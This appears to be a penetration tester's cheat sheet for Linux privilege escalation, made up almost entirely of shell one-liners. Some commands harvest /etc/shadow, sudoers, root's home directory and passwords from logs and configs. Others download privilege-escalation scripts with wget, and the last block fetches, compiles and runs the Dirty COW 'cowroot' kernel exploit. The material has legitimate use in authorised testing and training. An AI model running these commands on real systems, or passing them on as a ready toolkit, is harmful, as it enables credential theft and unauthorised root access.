## general enumeration

### Quick rough n ready enumeration - one liners
>  set variables
```
# set variables
OS=$(cat /etc/issue) 
KERNEL=$(cat /proc/version) 
HOSTNAME=$(hostname) 
ENV=$(env 2>/dev/null | grep -v 'LS_COLORS') 
WHOAMI=$(whoami) 
ID=$(id) 
ALLUSERS=$(cat /etc/passwd) 
SUPUSERS=$(grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0{print $1}') 
SUDOERS=$(cat /etc/sudoers 2>/dev/null | grep -v '#' 2>/dev/null) 
LOGGEDIN=$(who -a 2>/dev/null) 
netup=$(netstat -antup) 
NETSTAT=$(netstat -antup | grep -v 'TIME_WAIT') 
CRON=$(ls -la /etc/cron* 2>/dev/null) 
CRONW=$(ls -aRl /etc/cron* 2>/dev/null | awk '$1 ~ /w.$/' 2>/dev/null) 
CRONU=$(crontab -l 2>/dev/null) 
WWDIRSROOT=$(find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root) 
WWDIRS=$(find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root) 
WWFILES=$(find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null) 
SUID=$(find / \( -perm -2000 -o -perm -4000 \) -exec ls -ld {} \; 2>/dev/null) 
ROOTHOME=$(ls -ahlR /root 2>/dev/null) 
LOGPWDS=$(find /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null) 
CONFPWDS=$(find /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null) 
SHADOW=$(cat /etc/shadow 2>/dev/null) SUDO=$(sudo -V | grep version 2>/dev/null) 
TOOLS=$(which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null)
```
> print main variables
```
echo " : : : : : : " && echo " : : : : : : " && echo "ENVIROMENT & USERS : " && echo " : : : : : : " && echo "OS: $OS" && echo " Kernel: $KERNEL" && echo "Hostname: $HOSTNAME" && echo "Environment: $ENV" && echo "Your User: $WHOAMI" && echo "User groups: $ID" && echo "UserList: $ALLUSERS" && echo "Superusers: $SUPUSERS" && echo "Sudoers: $SUDOERS" && echo "WhosLoggedIn: $LOGGEDIN" && echo " : : : : : : " && echo " : : : : : : "  && echo "NETWORKING: "  && echo " : : : : : : " && echo "Network: $netup" && echo "OpenPorts: $NETSTAT" && echo " : : : : : : " && echo " : : : : : : "  && echo "CRON & SUDO: " && echo " : : : : : : " && echo "CronJobs: $CRON" && echo "Cron: $CRONW" && echo "YourCron: $CRONU" && echo "Listed Tools: $TOOLS" && echo "ShadowFile: $SHADOW" && echo "SudoMakeMeASandwich: $SUDO" && echo " : : : : : : "  && echo " :  T H E  : " && echo " : : : : : : "  && echo ":   E N D  : " && echo " : : : : : : " 
```

> Files Directories, search in files
```
echo " : : : : : : " && echo " : : : : : : " && echo "FILES DIRECTORIES INSIDE FILES: " && echo " : : : : : : " && echo "WorldWriteDirsRoot: $WWDIRSROOT" && echo "WorldWriteDirs: $WWDIRS" && echo "WorldWriteFiles: $WWFILES" && echo "SUIDBinaries: $SUID" && echo "RootHome: $ROOTHOME" && echo "PasswordsLogs: $LOGPWDS" && echo "PasswordsConfigs: $CONFPWDS" && echo " : : : : : : "  && echo " :  T H E  : " && echo " : : : : : : "  && echo ":   E N D  : " && echo " : : : : : : " 
```


### automated tools
method\linux\priv esc scripts\linux-exploit-check.sh
method\linux\priv esc scripts\linuxprivchecker.py
```

wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh

wget http://www.securitysift.com/download/linuxprivchecker.py

wget http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4.tar.gz
./unix-privesc-check standard
./unix-privesc-check detailed

wget https://www.exploit-db.com/download/40616 -O cowroot.c
gcc cowroot.c -o cowroot -pthread
./cowroot
&& echo 0 > /proc/sys/vm/dirty_writeback_centisecs
```
















